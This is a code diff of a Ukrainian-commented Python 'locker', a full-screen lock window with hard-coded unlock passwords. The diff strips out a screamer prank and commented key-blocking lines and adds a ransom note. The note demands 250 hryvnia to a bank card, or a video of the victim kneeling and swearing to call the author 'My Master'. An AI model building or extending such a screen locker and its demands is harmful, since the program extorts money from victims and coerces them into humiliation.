@@ -3,9 +3,7 @@
 
 import customtkinter as ctk
 import os
-import random
 import time
-import subprocess
 from tkinter import messagebox
 # import keyboard  # Закоментовано для тестування
 # import win32gui  # Не доступно в Linux
@@ -17,9 +15,6 @@ import sys
 PASSWORD = "14707"
 FAKE_PASSWORD = "Гусь"
 BACKUP_PASSWORD = "unlockmepls"
-
-# Аудіо для скрімера (MP3 буде відкриватися в системному плеєрі)
-SCREAMER_PATH = os.path.join("assets", "audio.mp3")
 
 # Теми та кольори
 ctk.set_appearance_mode("dark")
@@ -37,17 +32,6 @@ COLORS = {
     "error": "#f85149",
     "warning": "#d29922"
 }
-
-# Блокуємо комбінації клавіш (закоментовано для тестування)
-# keyboard.block_key("alt")
-# keyboard.block_key("tab")
-# keyboard.block_key("esc")
-# keyboard.block_key("windows")
-# keyboard.block_key("ctrl")
-
-# Функція для запуску гуся (заглушка для тестування)
-def start_goose():
-    print("🪿 Гусь запущений! (симуляція)")
 
 # Тестове вікно
 root = ctk.CTk()
@@ -135,20 +119,25 @@ attempts_label = ctk.CTkLabel(
 )
 attempts_label.pack(pady=(5, 20))
 
-# Умови (скорочена версія для тестування)
+# Умови (тестова версія)
 conditions = (
     "🎯 Тестовий режим локера\n"
     "Паролі для тестування:\n"
     "• 14707 - основний пароль\n"
-    "• Гусь - фейковий пароль (запуск скрімера)\n"
-    "• unlockmepls - резервний пароль"
+    "• Гусь - фейковий пароль\n"
+    "• unlockmepls - резервний пароль\n\n"
+    "Варіанти розблокування:\n"
+    "1. Оплата 250 гривень на банківську карту.\n"
+    "2. Відео, де ви стоїте на колінах і кажете:\n"
+    "\"Я, Ім'я, присягаюсь більше ніколи не суперечити зі своїм королем, "
+    "і присягаюсь називати його 'Мій Хазяїн'. Прошу розблокувати мій комп'ютер.\""
 )
 
 conditions_label = ctk.CTkLabel(
     content_frame, 
     text=conditions, 
     wraplength=500, 
-    font=ctk.CTkFont(size=16), 
+    font=ctk.CTkFont(size=14), 
     text_color=COLORS["text_secondary"], 
     justify="left"
 )
@@ -159,20 +148,10 @@ riddle_text = "💡 Загадка: Не корабель, а з вітрило�
 riddle = ctk.CTkLabel(
     content_frame, 
     text=riddle_text, 
-    font=ctk.CTkFont(size=18, weight="bold"), 
+    font=ctk.CTkFont(size=16, weight="bold"), 
     text_color=COLORS["warning"]
 )
 riddle.pack(pady=(15, 30))
-
-# Скрімер запуск (відкриття MP3 через системний плеєр)
-def play_screamer():
-    print("🔊 Скрімер запущений! (симуляція)")
-    if os.path.exists(SCREAMER_PATH):
-        # Для Linux використовуємо xdg-open замість os.startfile
-        try:
-            subprocess.Popen(['xdg-open', SCREAMER_PATH])
-        except:
-            print(f"Не вдалося відкрити {SCREAMER_PATH}")
 
 # Анімація помилки (замість тряски)
 def show_error_animation():
@@ -204,8 +183,8 @@ def unlock():
         messagebox.showinfo("Успіх", "Система розблокована!")
         root.destroy()
     elif user_input.lower().strip() == FAKE_PASSWORD.lower():
-        play_screamer()
         error_label.configure(text="Ох ні! Це фейковий пароль!")
+        show_error_animation()
     elif user_input == BACKUP_PASSWORD:
         messagebox.showinfo("Успіх", "Система розблокована через резервний пароль!")
         root.destroy()
@@ -236,13 +215,10 @@ def on_enter(event):
 entry.bind('<Return>', on_enter)
 entry.focus()  # Автофокус на поле вводу
 
-# Запускаємо гуся
-start_goose()
-
 if __name__ == "__main__":
-    print("🔒 Запуск тестової версії локера...")
+    print("🔒 Запуск тестової версії локера (без скрімера та гуся)...")
     print("📝 Доступні паролі:")
     print("   - 14707 (основний)")
-    print("   - Гусь (фейковий - запуск скрімера)")
+    print("   - Гусь (фейковий)")
     print("   - unlockmepls (резервний)")
     root.mainloop()
